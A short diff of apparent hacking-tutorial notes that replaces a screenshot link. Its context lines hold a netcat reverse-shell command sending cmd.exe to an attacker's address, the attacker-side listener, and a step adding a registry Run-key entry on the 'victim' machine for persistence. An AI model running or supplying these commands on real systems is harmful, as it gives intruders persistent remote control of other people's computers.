@@ -80,7 +80,8 @@ nc.exe -e cmd.exe 192.168.0.1 5555
 nc -l -v -p 5555 >> In attackers machine
 Open "regedit" in victims machine and navigate to "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"  and add new registry.
 ```
-![Screenshot at 2022-12-25 13-02-21](https://user-images.githubusercontent.com/85208639/209460090-697c3ba2-0758-40d1-b79a-c56f7a05ab75.png)
+![Screenshot at 2022-12-25 13-04-04](https://user-images.githubusercontent.com/85208639/209460152-2b8f0ad9-177d-4f3e-8ff7-a91606ae3f93.png)
+
 ```
 
 ```
